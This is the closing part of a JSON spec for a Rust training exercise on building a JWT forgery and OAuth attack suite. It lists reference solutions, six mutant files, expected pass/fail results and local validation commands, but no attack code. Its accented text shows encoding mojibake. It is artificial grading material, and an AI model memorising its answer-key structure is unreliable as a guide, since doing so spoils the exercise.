      "difficulty_stars": "â˜…â˜…â˜…â˜…â˜…â˜…â˜…â˜…â˜†â˜†",
      "language": "rust",
      "language_version": "2024",
      "duration_minutes": 240,
      "xp_base": 350,
      "xp_bonus_multiplier": 3,
      "bonus_tier": "AVANCÃ‰",
      "bonus_icon": "ğŸ”¥",
      "complexity_time": "T3 O(n)",
      "complexity_space": "S2 O(n)",
      "prerequisites": ["RSA", "HMAC", "Base64URL", "OAuth 2.0"],
      "domains": ["Crypto", "Net", "Encodage"],
      "domains_bonus": ["Probas"],
      "tags": ["jwt", "oauth", "authentication", "forgery", "phase3"],
      "meme_reference": "Catch Me If You Can"
    },

    "files": {
      "spec.json": "/* Section 4.9 */",
      "references/jwt_attack_suite_ref.rs": "/* Section 4.3 */",
      "references/jwt_attack_suite_bonus_ref.rs": "/* Section 4.6 */",
      "alternatives/jwt_attack_suite_alt1.rs": "/* Section 4.4 */",
      "mutants/mutant_a_boundary.rs": "/* Section 4.10 - Case sensitive none */",
      "mutants/mutant_b_safety.rs": "/* Section 4.10 - No JWT validation */",
      "mutants/mutant_c_resource.rs": "/* Section 4.10 - Memory accumulation */",
      "mutants/mutant_d_logic.rs": "/* Section 4.10 - OAuth CSRF logic */",
      "mutants/mutant_e_return.rs": "/* Section 4.10 - No forged token */",
      "mutants/mutant_f_edge.rs": "/* Section 4.10 - Base64 padding */",
      "tests/main.rs": "/* Section 4.2 */"
    },

    "validation": {
      "expected_pass": [
        "references/jwt_attack_suite_ref.rs",
        "references/jwt_attack_suite_bonus_ref.rs",
        "alternatives/jwt_attack_suite_alt1.rs"
      ],
      "expected_fail": [
        "mutants/mutant_a_boundary.rs",
        "mutants/mutant_b_safety.rs",
        "mutants/mutant_c_resource.rs",
        "mutants/mutant_d_logic.rs",
        "mutants/mutant_e_return.rs",
        "mutants/mutant_f_edge.rs"
      ]
    },

    "commands": {
      "validate_spec": "python3 hackbrain_engine_v22.py --validate-spec spec.json",
      "test_reference": "cargo test --release",
      "test_mutants": "python3 hackbrain_mutation_tester.py -r references/jwt_attack_suite_ref.rs -s spec.json --validate"
    }
  }
}
```

---

*Exercise crÃ©Ã© selon HACKBRAIN v5.5.2 â€” "Catch Me If You Can"*
*L'excellence pÃ©dagogique ne se nÃ©gocie pas â€” pas de raccourcis*
*Compatible ENGINE v22.1 + Mutation Tester*
